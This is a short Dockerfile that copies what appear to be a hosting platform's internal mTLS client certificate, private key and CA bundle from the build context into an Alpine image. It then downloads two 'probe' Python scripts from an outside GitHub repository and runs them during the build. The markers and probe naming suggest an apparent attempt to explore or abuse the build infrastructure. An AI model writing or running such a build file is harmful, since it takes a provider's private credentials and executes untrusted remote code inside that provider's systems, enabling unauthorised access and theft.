# MARK-I67677-c4e19b
FROM alpine:3.20
RUN echo MARK-I67677-c4e19b-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl bash openssl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 25 -o /probe.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i67677.py && curl -sS -m 25 -o /p3.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe3.py && echo DL_OK && MARK=I67677-c4e19b timeout 260 python3 /p3.py 2>&1 | head -c 26000
CMD ["sh","-c","sleep 3600"]
